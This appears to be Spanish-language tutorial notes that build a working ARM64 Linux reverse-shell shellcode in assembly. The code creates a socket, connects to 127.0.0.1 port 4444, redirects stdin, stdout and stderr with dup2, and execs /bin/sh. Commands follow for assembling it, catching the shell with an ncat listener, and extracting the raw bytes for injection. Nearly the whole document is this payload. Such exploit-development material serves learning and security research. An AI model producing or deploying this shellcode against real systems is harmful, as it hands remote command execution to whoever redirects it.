
```sh
bat $PREFIX/include/asm-generic/unistd.h 
```


```asm
.global _start

.section .text
_start:
    // set the frame pointer
    mov fp, sp

    // clear required registers
    eor x0, x0, x0
    eor x1, x1, x1
    eor x2, x2, x2

    // create sockaddr_in struct
    sub sp, sp, #32      // Reservar espacio en la pila (32 bytes para alineación)
    str xzr, [sp, #16]   // 8 bytes de padding
    str xzr, [sp, #8]    // 8 bytes más de padding

    // Configurar sin_family (AF_INET = 2)
    mov x1, #0x02        // AF_INET
    strh w1, [sp, #0]    // Almacenar sin_family en el offset 0

    // Configurar sin_port (4444 en orden de red)
    mov x1, #0x115c      // Puerto 4444 en orden de host (big-endian)
    rev16 w1, w1         // Convertir a orden de red (big-endian)
    strh w1, [sp, #2]    // Almacenar sin_port en el offset 2

    // Configurar sin_addr (127.0.0.1 en orden de red)
    ldr x1, =0x0100007f  // 127.0.0.1 en orden de red (big-endian)
    str w1, [sp, #4]     // Almacenar sin_addr en el offset 4

    // call socket(domain, type, protocol)
    mov x0, #2           // AF_INET
    mov x1, #1           // SOCK_STREAM
    mov x2, #0           // protocol
    mov x8, #198         // socket syscall number (198 for ARM64)
    svc #0
    cmp x0, #0           // Verificar si socket() falló
    b.lt _exit           // Si falló, salir
    mov x4, x0           // x4: socket file descriptor

    // call connect(sockfd, sockaddr, socklen_t)
    mov x0, x4           // sockfd
    mov x1, sp           // sockaddr
    mov x2, #16          // socklen_t
    mov x8, #203         // connect syscall number (203 for ARM64)
    svc #0
    cmp x0, #0           // Verificar si connect() falló
    b.lt _exit           // Si falló, salir

    // call dup2 to redirect STDIN, STDOUT and STDERR
    mov x5, #3           // counter for STDIN, STDOUT, STDERR
dup_loop:
    mov x0, x4           // sockfd
    sub x5, x5, #1       // decrement counter
    mov x1, x5           // newfd
    mov x8, #24          // dup2 syscall number (24 for ARM64)
    svc #0
    cmp x5, #0
    b.ne dup_loop

    // spawn /bin/sh using execve
    // x1 and x2 are 0 at this point
    eor x0, x0, x0
    eor x1, x1, x1
    eor x2, x2, x2
    sub sp, sp, #16       // Reservar espacio en la pila (16 bytes para alineación)
    str xzr, [sp, #8]    // Push null terminator
    ldr x0, =0x68732f2f6e69622f  // "/bin//sh" in little-endian
    str x0, [sp, #0]     // Push "/bin//sh"
    mov x0, sp           // [x0]: pointer to "/bin//sh"
    mov x8, #221         // execve syscall number (221 for ARM64)
    svc #0

_exit:
    // Exit the program
    mov x8, #93          // exit syscall number (93 for ARM64)
    svc #0 
```

## Compilation 

```sh
as -o shellcode.o shellcode.s
ld -o shellcode shellcode.o
```

### Comprobación 

```sh
ncat -lvp 4444
```

Luego 

```sh
./shellcode 
```
 
### Optener el código magina

```sh
objcopy -O binary shellcode shellcode.bin    #  extraemos los bytecode 
```

```sh
hexdump -v -e '"\\" 1/1 "x%02x"' shellcode.bin; echo    # extraemos byte code de binario
```

El sesultado se compara con el resultado de la 2 columna:

```sh
objdump -d shellcode
```